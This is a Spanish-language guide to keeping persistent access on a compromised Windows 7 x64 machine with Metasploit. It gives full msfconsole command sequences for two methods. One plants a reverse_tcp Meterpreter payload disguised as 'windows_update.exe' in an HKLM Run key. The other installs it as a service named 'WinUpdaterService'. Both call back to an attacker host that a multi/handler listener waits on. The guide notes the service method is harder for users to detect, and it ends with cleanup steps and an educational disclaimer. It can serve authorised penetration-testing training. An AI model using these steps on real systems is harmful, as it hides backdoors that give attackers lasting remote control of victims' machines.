# Guía de Persistencia en Windows con Metasploit (Meterpreter x64)

Esta guía detalla los pasos para configurar persistencia en un entorno controlado utilizando una sesión activa de Meterpreter con privilegios elevados (**NT AUTHORITY\SYSTEM**).

---

## 📋 Información de la Sesión Actual
* **Objetivo:** Windows 7 Professional x64 (192.168.0.11)
* **Atacante (LHOST):** 192.168.0.5
* **Puerto (LPORT):** 4444
* **Privilegios:** SYSTEM (Máximo nivel)

---

## 🛠️ Método 1: Persistencia mediante Registro (Ejecutable)

Este método sube un archivo ejecutable (`.exe`) a la máquina víctima y crea una clave en el registro de Windows para que se ejecute automáticamente al iniciar el sistema. Al tener privilegios `SYSTEM`, se instalará a nivel de máquina (`HKLM`), afectando a todos los usuarios.

### Paso 1: Enviar la sesión actual a segundo plano
Si estás dentro de la consola de Meterpreter, pausa la sesión para regresar al menú principal de `msfconsole`:

```bash
meterpreter > background
```
*Nota: Confirma el ID de tu sesión (usualmente `1`). Puedes verificarlo con el comando `sessions`.*

### Paso 2: Configurar y ejecutar el módulo de persistencia
Carga el módulo `persistence_exe` y configura los parámetros correspondientes a la arquitectura **x64**:

```bash
msf6 > use post/windows/manage/persistence_exe  #windows 7 use post/multi/recon/persistence_suggester set SESSION, run y sessions -i 1
msf6 post(windows/manage/persistence_exe) > set SESSION 1
msf6 post(windows/manage/persistence_exe) > set REXENAME windows_update.exe
msf6 post(windows/manage/persistence_exe) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 post(windows/manage/persistence_exe) > set LHOST 192.168.0.5
msf6 post(windows/manage/persistence_exe) > set LPORT 4444
msf6 post(windows/manage/persistence_exe) > run
```

### Paso 3: Configurar el receptor permanente (Multi/Handler)
Para recibir la conexión cuando el objetivo se reinicie, deja un agente de escucha corriendo en segundo plano:

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.0.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j
```

---

## ⚙️ Método 2: Persistencia como Servicio de Windows (Alternativa Avanzada)

Al contar con acceso `SYSTEM`, una alternativa más robusta y difícil de detectar para el usuario común es crear un **Servicio de Windows** que ejecute el payload en el arranque.

### Paso 1: Configurar el módulo de servicio
Regresa al menú principal y carga el módulo de servicios persistentes:

```bash
msf6 > use exploit/windows/local/persistence_service
msf6 exploit(windows/local/persistence_service) > set SESSION 1
msf6 exploit(windows/local/persistence_service) > set SERVICE_NAME WinUpdaterService
msf6 exploit(windows/local/persistence_service) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/persistence_service) > set LHOST 192.168.0.5
msf6 exploit(windows/local/persistence_service) > set LPORT 4444
msf6 exploit(windows/local/persistence_service) > exploit
```

### Paso 2: Dejar el receptor escuchando
Al igual que en el método anterior, asegúrate de tener el `exploit/multi/handler` activo con el parámetro `-j` para recibir la sesión automáticamente.

---

## 🔍 Verificación y Limpieza

### Cómo verificar la persistencia
1. Interactúa nuevamente con tu sesión original (`sessions -i 1`).
2. Entra a la Shell de Windows escribiendo `shell`.
3. Verifica si el registro fue creado con el comando:
   ```cmd
   reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
   ```

### 🗑️ Limpieza (Post-Auditoría)
Metasploit genera un archivo de registro (log) durante la instalación de la persistencia. Al finalizar el ejercicio, toma nota de las rutas de los archivos `.exe` creados y las claves de registro insertadas para eliminarlos manualmente o usar el comando `resource` con el script de desinstalación generado automáticamente por MSF.

---
⚠️ **Nota de seguridad:** Este documento fue creado con fines exclusivamente educativos y de auditoría autorizada.
